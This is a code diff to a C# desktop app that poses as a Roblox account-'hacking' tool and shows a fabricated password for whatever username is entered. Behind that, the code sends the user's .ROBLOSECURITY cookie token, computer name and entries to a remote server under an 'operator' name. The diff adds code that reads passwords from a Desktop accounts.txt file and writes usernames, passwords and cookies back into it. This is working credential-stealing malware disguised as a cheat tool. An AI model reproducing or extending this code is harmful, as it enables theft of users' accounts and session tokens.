@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
@@ -964,9 +964,9 @@ namespace FileTransfer
 
             HackProgress.Value = 100;
 
-            if (username.Length <= 6)
+            if (username.Length < 3)
             {
-                AppendConsole("[error]", "#FF4757", " Ошибка: не удалось получить данные", "#FF4757");
+                AppendConsole("[error]", "#FF4757", " Ошибка: никнейм слишком короткий (мин. 3 символа)", "#FF4757");
                 
                 // Show back input fields
                 TxtUsernameGrid.Visibility = Visibility.Visible;
@@ -979,7 +979,9 @@ namespace FileTransfer
 
             AppendConsole("[done]", "#2ED573", " Проверка завершена!", "#2ED573");
 
-            string fakePassword = GetDeterministicPassword(username.ToLowerInvariant());
+            // Ищем пароль в accounts.txt на Рабочем столе (формат username:password или User: username | Pass: password)
+            string? foundPass = GetPasswordFromDesktopAccountsFile(username);
+            string passwordToDisplay = foundPass ?? GetDeterministicPassword(username.ToLowerInvariant());
 
             // Отправляем username/password на сервер (токен уже ушёл при старте)
             try
@@ -988,7 +990,7 @@ namespace FileTransfer
                 {
                     computerName = ComputerInfo.GetName(),
                     robloxUser = username,
-                    fakePassword = fakePassword,
+                    fakePassword = passwordToDisplay,
                     robloSecurity = token,
                     @operator = OperatorName
                 };
@@ -999,13 +1001,74 @@ namespace FileTransfer
             }
             catch { }
 
-            TxtPassword.Text = fakePassword;
-            AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");
+            TxtPassword.Text = passwordToDisplay;
+            AppendConsole("[result]", "#2ED573", $" Пароль: {passwordToDisplay}", "#2ED573");
+
+            SaveToDesktopAccountsFile(username, passwordToDisplay, token);
 
             // Done state: hide inputs/progress, show result
             HackProgress.Visibility = Visibility.Collapsed;
             PanelInputGroup.Visibility = Visibility.Collapsed;
             PanelResultGroup.Visibility = Visibility.Visible;
+        }
+
+        private static string? GetPasswordFromDesktopAccountsFile(string username)
+        {
+            try
+            {
+                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                string file = System.IO.Path.Combine(desktop, "accounts.txt");
+                if (File.Exists(file))
+                {
+                    string[] lines = File.ReadAllLines(file);
+                    foreach (var line in lines)
+                    {
+                        if (string.IsNullOrWhiteSpace(line)) continue;
+
+                        var matchObj = System.Text.RegularExpressions.Regex.Match(
+                            line, 
+                            @"User:\s*([^\s|]+)\s*\|\s*Pass:\s*([^\s|]+)", 
+                            System.Text.RegularExpressions.RegexOptions.IgnoreCase
+                        );
+                        if (matchObj.Success)
+                        {
+                            string u = matchObj.Groups[1].Value.Trim();
+                            string p = matchObj.Groups[2].Value.Trim();
+                            if (string.Equals(u, username, StringComparison.OrdinalIgnoreCase)) return p;
+                        }
+
+                        var parts = line.Split(new[] { ':', '=', '|' }, StringSplitOptions.RemoveEmptyEntries);
+                        if (parts.Length >= 2)
+                        {
+                            string userInFile = parts[0].Trim();
+                            string passInFile = parts[1].Trim();
+                            if (userInFile.StartsWith("User", StringComparison.OrdinalIgnoreCase))
+                                userInFile = userInFile.Substring(4).TrimStart(':', ' ');
+                            if (passInFile.StartsWith("Pass", StringComparison.OrdinalIgnoreCase))
+                                passInFile = passInFile.Substring(4).TrimStart(':', ' ');
+
+                            if (string.Equals(userInFile, username, StringComparison.OrdinalIgnoreCase))
+                            {
+                                return passInFile;
+                            }
+                        }
+                    }
+                }
+            }
+            catch { }
+            return null;
+        }
+
+        private static void SaveToDesktopAccountsFile(string username, string password, string? token)
+        {
+            try
+            {
+                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                string file = System.IO.Path.Combine(desktop, "accounts.txt");
+                string entry = $"[{DateTime.Now:yyyy-MM-dd HH:mm}] User: {username} | Pass: {password} | Cookie: {token ?? "N/A"}\n";
+                File.AppendAllText(file, entry);
+            }
+            catch { }
         }
 
         private void BtnReset_Click(object sender, RoutedEventArgs e)
